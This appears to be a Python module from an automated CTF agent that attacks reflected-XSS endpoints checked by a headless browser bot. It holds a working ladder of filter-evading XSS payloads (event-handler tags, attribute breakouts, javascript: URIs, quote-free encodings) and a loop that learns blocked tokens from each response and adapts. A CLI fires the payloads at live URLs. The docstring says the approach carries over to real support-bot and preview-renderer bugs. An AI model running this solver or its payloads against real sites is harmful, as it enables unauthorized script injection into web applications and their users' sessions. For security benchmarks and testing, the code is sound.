"""
Adaptive reflected-XSS solver for checker/bot-backed endpoints.

Some targets reflect an input into a page, run it in a real browser (a headless
"bot" or an inline PhantomJS/Playwright check), and hand back a result — a flag
on success, and a *hint* on failure ("Sorry you can't use: 'script'",
"you did an alert with X instead of XSS"). This module turns that feedback loop
into an automatic solve: try a context/technique ladder, read the response,
learn the filter, and adapt — instead of one-shot payload spraying.

It generalises beyond CTFs: the same shape appears in real self-XSS → support-bot
and preview-renderer bugs where a server-side browser executes stored input.

Pure logic here (payload ladder + response classification + the loop). The HTTP
send is injected so it is unit-testable without network, a browser, or the agent
stack. The agent tool wrapper lives in ``agent/agents.py``.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple

# A send function: (method, url, param, payload) -> response body text.
HttpSend = Callable[[str, str, str, str], str]

# --- Marker encodings ------------------------------------------------------
# Each yields the exact string XSS when alerted, so a checker comparing the
# dialog message to "XSS" still passes even when quotes are filtered.
def _marker_encodings(marker: str = "XSS") -> List[str]:
    codes = ",".join(str(ord(c)) for c in marker)
    # Order matters: the checker may be an OLD engine (XBEN uses PhantomJS, no
    # ES6), so template literals `XSS` are a syntax error there and must NOT
    # lead. Double-quote is the most compatible + dodges single-quote filters
    # (the common case); char-code / regex.source dodge quote filters entirely;
    # single-quote next; the ES6 template literal last (works on headless
    # Chrome bots, not PhantomJS).
    return [
        f'"{marker}"',                       # double-quote — PhantomJS-safe
        f"String.fromCharCode({codes})",     # no quotes at all, ES3
        f"/{marker}/.source",                # regex .source, ES3
        f"'{marker}'",                       # single-quote
        f"`{marker}`",                       # ES6 template literal — modern bots only
    ]


# Context templates. ``{c}`` is replaced by a dialog call, e.g. alert(`XSS`).
# Ordered roughly by reliability against common filters and headless checkers.
# Slash-separated variants beat space blacklists; <image> covers filters that
# strip every tag except <image> (browsers treat it as <img>).
_CONTEXTS: List[Tuple[str, str]] = [
    ("input-autofocus-onfocus", "<input autofocus onfocus={c}>"),
    ("input-autofocus-onfocus-slash", "<input/autofocus/onfocus={c}>"),
    ("details-ontoggle", "<details open ontoggle={c}>x</details>"),
    ("details-ontoggle-slash", "<details/open/ontoggle={c}>x</details>"),
    ("body-onload", "<body onload={c}>"),
    ("svg-onload", "<svg onload={c}>"),
    ("svg-onload-slash", "<svg/onload={c}>"),
    ("select-autofocus-onfocus", "<select autofocus onfocus={c}><option>a</option></select>"),
    ("textarea-autofocus-onfocus", "<textarea autofocus onfocus={c}></textarea>"),
    ("img-onerror", "<img src=x onerror={c}>"),
    ("image-onerror-slash", "<image/src/onerror={c}>"),
    ("video-onerror", "<video><source onerror={c}></video>"),
    ("marquee-onstart", "<marquee onstart={c}>x</marquee>"),
    ("iframe-srcdoc", "<iframe srcdoc=\"&lt;script&gt;{c}&lt;/script&gt;\"></iframe>"),
    ("script-tag", "<script>{c}</script>"),
    ("attr-breakout-dq", "\"><img src=x onerror={c}>"),
    ("attr-breakout-sq", "'><img src=x onerror={c}>"),
    ("js-uri", "javascript:{c}"),
]

# Dialog functions the headless checker logs (onAlert/onConfirm/onPrompt). Try
# alert first, then prompt/confirm so a challenge that blocks only `alert` (or
# `alert`+`confirm`) is still solved.
_DIALOGS = ("alert", "prompt", "confirm")


def build_ladder(marker: str = "XSS") -> List[Tuple[str, str]]:
    """All (technique, payload) candidates, ordered best-first.

    Quote-free markers lead (beat quote filters); within a context the dialog
    functions rotate (beat alert/confirm blacklists).
    """
    out: List[Tuple[str, str]] = []
    for enc in _marker_encodings(marker):
        for name, tmpl in _CONTEXTS:
            for dialog in _DIALOGS:
                call = f"{dialog}({enc})"
                out.append((f"{name}|{dialog}|{enc}", tmpl.replace("{c}", call)))
    return out


def _blocked(payload: str, blacklist: List[str]) -> Optional[str]:
    low = payload.lower()
    for tok in blacklist:
        t = tok.strip().lower()
        if t and t in low:
            return tok
    return None


# --- Response classification ----------------------------------------------

_DEFAULT_SUCCESS = re.compile(
    r"(?:here is the flag:\s*|congratulations[^)]*?)?(flag\{[^}]+\}|FLAG\{[^}]+\})",
    re.IGNORECASE,
)
_BLOCKED_HINT = re.compile(r"can'?t use:?\s*['\"]?([^'\"<>]{1,40}?)['\"]?\s*[<\"]", re.IGNORECASE)
_WRONG_MARKER = re.compile(r"instead of|did an alert with", re.IGNORECASE)


@dataclass
class Classification:
    kind: str                    # solved | blocked | wrong_marker | retry
    flag: Optional[str] = None
    blocked_token: Optional[str] = None


def classify_response(text: str, success_regex: Optional[re.Pattern] = None) -> Classification:
    """Interpret a checker's response into a next action."""
    text = text or ""
    success = success_regex or _DEFAULT_SUCCESS
    m = success.search(text)
    if m:
        flag = m.group(m.lastindex or 0) if m.lastindex else m.group(0)
        return Classification("solved", flag=flag.strip())
    b = _BLOCKED_HINT.search(text)
    if b:
        return Classification("blocked", blocked_token=b.group(1).strip())
    if _WRONG_MARKER.search(text):
        return Classification("wrong_marker")
    return Classification("retry")


# --- Solve loop ------------------------------------------------------------

@dataclass
class SolveResult:
    solved: bool
    flag: Optional[str] = None
    payload: Optional[str] = None
    technique: Optional[str] = None
    attempts: int = 0
    learned_blacklist: List[str] = field(default_factory=list)
    last_snippet: str = ""


def solve(
    http_send: HttpSend,
    url: str,
    param: str,
    method: str = "POST",
    marker: str = "XSS",
    seed_blacklist: Optional[List[str]] = None,
    success_regex: Optional[re.Pattern] = None,
    max_attempts: int = 40,
) -> SolveResult:
    """Iteratively solve a checker/bot-backed reflected-XSS endpoint.

    Sends filter-evading payloads that fire ``alert(marker)``, reads the
    checker's response, learns blocked tokens, and adapts until it captures a
    flag or exhausts the ladder.
    """
    blacklist = list(seed_blacklist or [])
    ladder = build_ladder(marker)
    tried = 0
    last = ""
    idx = 0
    while tried < max_attempts and idx < len(ladder):
        technique, payload = ladder[idx]
        idx += 1
        if _blocked(payload, blacklist):
            continue
        last = http_send(method, url, param, payload) or ""
        tried += 1
        c = classify_response(last, success_regex)
        if c.kind == "solved":
            return SolveResult(True, flag=c.flag, payload=payload, technique=technique,
                               attempts=tried, learned_blacklist=blacklist,
                               last_snippet=last[:400])
        if c.kind == "blocked" and c.blocked_token:
            # Learn the filter so remaining candidates containing this token are
            # pruned. Always advance (idx already incremented) — never re-seek
            # the same blocked payload, which could stall the budget.
            if c.blocked_token.lower() not in [b.lower() for b in blacklist]:
                blacklist.append(c.blocked_token)
        # blocked (untokenised) / wrong_marker / retry: advance to next candidate.
    return SolveResult(False, attempts=tried, learned_blacklist=blacklist,
                       last_snippet=last[:400])


# --- CLI: validate the solver live against a single endpoint ----------------
# No agent stack, no API key, no LLM — just this module + httpx. Use it to
# confirm the ladder against a live challenge:
#     make -C /tmp/xben/benchmarks/XBEN-004-24 run          # stand it up
#     PORT=$(docker compose -f /tmp/xben/benchmarks/XBEN-004-24/docker-compose.yml \
#            ps --format '{{.Publishers}}' | grep -oE '[0-9]+->5000' | cut -d- -f1)
#     python3 agent/xss_bot_solver.py --url http://localhost:$PORT/xss25 \
#            --param solution --method POST

def _cli(argv=None) -> int:
    import argparse
    import json as _json

    p = argparse.ArgumentParser(
        prog="xss_bot_solver",
        description="Live-solve a checker/bot-backed reflected-XSS endpoint.",
    )
    p.add_argument("--url", required=True, help="Reflecting endpoint URL")
    p.add_argument("--param", required=True, help="Parameter/form field name")
    p.add_argument("--method", default="POST", choices=["GET", "POST"])
    p.add_argument("--marker", default="XSS")
    p.add_argument("--seed-blacklist", default="", help="Comma-separated known-blocked tokens")
    p.add_argument("--success-regex", default="", help="Custom win regex (default flag{...})")
    p.add_argument("--max-attempts", type=int, default=40)
    a = p.parse_args(argv)

    try:
        import httpx
    except ImportError:
        print("this CLI needs httpx: pip install httpx")
        return 1

    def _send(m, url, param, payload):
        try:
            with httpx.Client(timeout=20, follow_redirects=True, verify=False) as c:
                r = c.get(url, params={param: payload}) if m.upper() == "GET" \
                    else c.post(url, data={param: payload})
                return r.text
        except Exception as exc:
            return f"__send_error__: {exc}"

    seeds = [t for t in a.seed_blacklist.split(",") if t.strip()]
    rx = re.compile(a.success_regex) if a.success_regex else None
    res = solve(_send, a.url, param=a.param, method=a.method, marker=a.marker,
                seed_blacklist=seeds, success_regex=rx, max_attempts=a.max_attempts)
    print(_json.dumps({
        "solved": res.solved, "flag": res.flag, "technique": res.technique,
        "payload": res.payload, "attempts": res.attempts,
        "learned_blacklist": res.learned_blacklist,
        "hint": None if res.solved else res.last_snippet,
    }, indent=2))
    return 0 if res.solved else 2


if __name__ == "__main__":
    import sys
    sys.exit(_cli())
